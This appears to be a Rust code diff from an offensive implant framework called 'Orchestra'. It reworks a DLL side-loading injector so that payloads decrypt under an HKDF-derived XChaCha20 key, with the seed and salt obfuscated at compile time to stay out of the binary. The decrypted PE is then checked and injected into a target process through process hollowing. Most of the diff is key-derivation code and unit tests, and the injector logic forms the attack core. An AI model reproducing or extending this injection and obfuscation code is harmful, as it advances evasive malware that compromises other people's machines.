@@ -22,8 +22,8 @@
 ///
 /// **Key derivation:**
 ///   The 32-byte XChaCha20-Poly1305 key is derived from a build-time seed
-///   using FNV-1a hashing and SplitMix64 expansion — the same approach used
-///   by the `string_crypt` crate for compile-time string encryption.
+///   using HKDF-SHA256 (RFC 5869).  The build-time IKM and salt are both
+///   embedded via `string_crypt::enc_str!` so neither appears in the binary.
 ///
 /// **Export forwarding / DLL generation:**
 ///   The `ExportConfig` struct is provided for build-time DLL generation tools
@@ -55,65 +55,92 @@ pub struct ExportConfig {
     pub ordinal_exports: Vec<(u16, String)>,
 }
 
-// ── Key derivation ────────────────────────────────────────────────────────────
+// ── Key derivation (HKDF-SHA256, RFC 5869) ──────────────────────────────────
 //
-// Derives a 32-byte XChaCha20-Poly1305 key from a build-time seed constant
-// using FNV-1a hashing and SplitMix64 expansion.  The seed is embedded via
-// `string_crypt::enc_str!` so the key is not visible as a plain string in
-// the binary.
+// Derives cryptographic keys from a build-time seed using HKDF-SHA256.
+// The seed (IKM) is embedded via `string_crypt::enc_str!` and a compile-time
+// salt is generated via `string_crypt::enc_str!` as well, so neither appears
+// as a plain string in the binary.
+
+/// Build-time salt for HKDF Extract phase.  Embedded via `string_crypt::enc_str!`
+/// so the salt is not visible as a plain string in the binary.
+const HKDF_SALT_ENC: &[u8] = &string_crypt::enc_str!("ORCHESTRA_HKDF_SALT");
+
+/// Perform HKDF-SHA256 Extract-then-Expand (RFC 5869).
+///
+/// * `ikm`  – Input Keying Material (the master key / seed).
+/// * `salt` – Salt for the Extract phase.
+/// * `info` – Context / application-specific information for Expand.
+/// * `out_len` – Number of output keying material bytes to produce.
+///
+/// Returns `out_len` bytes of OKM, or panics if `out_len > 255 * 32`.
+fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> Vec<u8> {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    type HmacSha256 = Hmac<Sha256>;
+
+    assert!(
+        out_len <= 255 * 32,
+        "HKDF-SHA256 output too large: {out_len} > 8160"
+    );
+
+    // ── Extract: PRK = HMAC-SHA256(salt, IKM) ────────────────────────────
+    let mut mac = HmacSha256::new_from_slice(salt)
+        .expect("HMAC-SHA256 accepts any key length");
+    mac.update(ikm);
+    let prk = mac.finalize().into_bytes();
+
+    // ── Expand: T(1) = HMAC-SHA256(PRK, info || 0x01) ────────────────────
+    //             T(n) = HMAC-SHA256(PRK, T(n-1) || info || n)
+    //             OKM  = T(1) || T(2) || …  (truncated to out_len)
+    let mut okm = Vec::with_capacity(out_len);
+    let mut t_prev = Vec::<u8>::new();
+    let mut counter: u8 = 0;
+
+    while okm.len() < out_len {
+        counter = counter
+            .checked_add(1)
+            .expect("HKDF expand counter overflow");
+        let mut mac = HmacSha256::new_from_slice(&prk)
+            .expect("HMAC-SHA256 accepts any key length");
+        mac.update(&t_prev);
+        mac.update(info);
+        mac.update(&[counter]);
+        t_prev = mac.finalize().into_bytes().to_vec();
+        okm.extend_from_slice(&t_prev);
+    }
+    okm.truncate(out_len);
+    okm
+}
 
 /// Derive the 32-byte payload decryption key from the build-time seed.
 #[cfg(any(windows, test))]
 fn derive_payload_key() -> [u8; 32] {
-    // Build-time seed constant — encrypted at compile time by string_crypt.
-    let seed_bytes = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
-    derive_key_from_seed(&seed_bytes, b"payload_encryption_key_v1")
+    // Build-time IKM — encrypted at compile time by string_crypt.
+    let ikm = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
+    let okm = hkdf_sha256_derive(
+        &ikm,
+        HKDF_SALT_ENC,
+        b"orchestra-dll-sideload-aes-key",
+        32,
+    );
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&okm[..32]);
+    key
 }
 
 /// Derive a 16-byte RC4 key (used for re-encryption in the stub data block).
 #[allow(dead_code)]
 fn derive_stub_rc4_key() -> [u8; 16] {
-    let seed_bytes = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
-    let full = derive_key_from_seed(&seed_bytes, b"stub_rc4_key_v1");
+    let ikm = string_crypt::enc_str!("ORCHESTRA_PAYLOAD_KEY_SEED");
+    let okm = hkdf_sha256_derive(
+        &ikm,
+        HKDF_SALT_ENC,
+        b"orchestra-dll-sideload-rc4-key",
+        32,
+    );
     let mut key = [0u8; 16];
-    key.copy_from_slice(&full[..16]);
-    key
-}
-
-/// Generic key derivation: FNV-1a over seed + label, then SplitMix64 expansion.
-fn derive_key_from_seed(seed: &[u8], label: &[u8]) -> [u8; 32] {
-    // FNV-1a hash over seed || label
-    let mut state: u64 = 0xcbf29ce484222325u64;
-    for &b in seed {
-        if b == 0 {
-            break;
-        }
-        state ^= b as u64;
-        state = state.wrapping_mul(0x100000001b3);
-    }
-    for &b in label {
-        state ^= b as u64;
-        state = state.wrapping_mul(0x100000001b3);
-    }
-    // Ensure non-zero
-    if state == 0 {
-        state = 0x9e3779b97f4a7c15;
-    }
-
-    // SplitMix64 to expand into 4 × u64 = 32 bytes
-    const SM64_GAMMA: u64 = 0x9E3779B97F4A7C15;
-    const SM64_M1: u64 = 0xBF58476D1CE4E5B9;
-    const SM64_M2: u64 = 0x94D049BB133111EB;
-    let mut sm = state;
-    let mut key = [0u8; 32];
-    for chunk in key.chunks_mut(8) {
-        sm = sm.wrapping_add(SM64_GAMMA);
-        let mut z = sm;
-        z = (z ^ (z >> 30)).wrapping_mul(SM64_M1);
-        z = (z ^ (z >> 27)).wrapping_mul(SM64_M2);
-        z = z ^ (z >> 31);
-        chunk.copy_from_slice(&z.to_le_bytes());
-    }
+    key.copy_from_slice(&okm[..16]);
     key
 }
 
@@ -204,15 +231,18 @@ impl crate::injection::Injector for DllSideLoadInjector {
             PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE,
         };
 
-        let is_pe = payload_has_valid_pe_headers(payload);
-
         // ── 1. Derive the decryption key from the build-time seed ──────────
         let key = derive_payload_key();
 
         // ── 2. Decrypt the XChaCha20-Poly1305 outer layer ──────────────────
         let plaintext = decrypt_xchacha20_payload(payload, &key)?;
 
-        // ── 3. PE payloads: fall back to process hollowing ─────────────────
+        // ── 3. Validate PE headers on the *decrypted* payload ──────────────
+        //
+        // This check MUST run after decryption; checking the ciphertext would
+        // always fail (it's encrypted noise).
+        let is_pe = payload_has_valid_pe_headers(&plaintext);
+
         if is_pe {
             return hollowing::inject_into_process(pid, &plaintext)
                 .map_err(|e| anyhow!("DllSideLoad: in-memory PE injection failed: {e}"));
@@ -460,24 +490,62 @@ mod tests {
         assert_ne!(
             &payload_key[..16],
             rc4_key.as_slice(),
-            "different labels must produce different keys"
+            "different info labels must produce different keys"
         );
     }
 
     #[test]
-    fn test_derive_key_from_seed_different_labels() {
-        let seed = b"test_seed";
-        let k1 = derive_key_from_seed(seed, b"label_a");
-        let k2 = derive_key_from_seed(seed, b"label_b");
-        assert_ne!(k1, k2, "different labels → different keys");
+    fn test_hkdf_sha256_derive_deterministic() {
+        let ikm = b"test_ikm_123";
+        let salt = b"test_salt";
+        let info = b"test_info";
+        let k1 = hkdf_sha256_derive(ikm, salt, info, 32);
+        let k2 = hkdf_sha256_derive(ikm, salt, info, 32);
+        assert_eq!(k1, k2, "same HKDF inputs → same output");
     }
 
     #[test]
-    fn test_derive_key_from_seed_deterministic() {
-        let seed = b"test_seed";
-        let k1 = derive_key_from_seed(seed, b"test_label");
-        let k2 = derive_key_from_seed(seed, b"test_label");
-        assert_eq!(k1, k2, "same inputs → same key");
+    fn test_hkdf_sha256_derive_different_info() {
+        let ikm = b"test_ikm_123";
+        let salt = b"test_salt";
+        let k1 = hkdf_sha256_derive(ikm, salt, b"context_a", 32);
+        let k2 = hkdf_sha256_derive(ikm, salt, b"context_b", 32);
+        assert_ne!(k1, k2, "different info → different keys");
+    }
+
+    #[test]
+    fn test_hkdf_sha256_derive_different_salt() {
+        let ikm = b"test_ikm_123";
+        let info = b"test_info";
+        let k1 = hkdf_sha256_derive(ikm, b"salt_a", info, 32);
+        let k2 = hkdf_sha256_derive(ikm, b"salt_b", info, 32);
+        assert_ne!(k1, k2, "different salt → different keys");
+    }
+
+    #[test]
+    fn test_hkdf_sha256_derive_output_len() {
+        let out = hkdf_sha256_derive(b"ikm", b"salt", b"info", 48);
+        assert_eq!(out.len(), 48);
+        // Should produce at least 2 blocks (32 + 16 bytes)
+        let out = hkdf_sha256_derive(b"ikm", b"salt", b"info", 64);
+        assert_eq!(out.len(), 64);
+    }
+
+    /// RFC 5869 Test Case 1 (SHA-256) verification vector.
+    #[test]
+    fn test_hkdf_sha256_rfc5869_vector() {
+        // RFC 5869, Appendix A, Test Case 1
+        let ikm = hex::decode("0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b").unwrap();
+        let salt = hex::decode("000102030405060708090a0b0c").unwrap();
+        let info = hex::decode("f0f1f2f3f4f5f6f7f8f9").unwrap();
+        let expected_okm = hex::decode(
+            "3cb25f25faacd57a90434f64d0362f2a2d2d0a90cf1a5a4c5db02d56ecc4c5bf34007208d5b887185865",
+        )
+        .unwrap();
+
+        // Verify our HKDF matches RFC 5869 test vector.
+        let okm = hkdf_sha256_derive(&ikm, &salt, &info, 42);
+        assert_eq!(okm, expected_okm, "HKDF OKM must match RFC 5869 Test Case 1");
     }
 
     #[test]
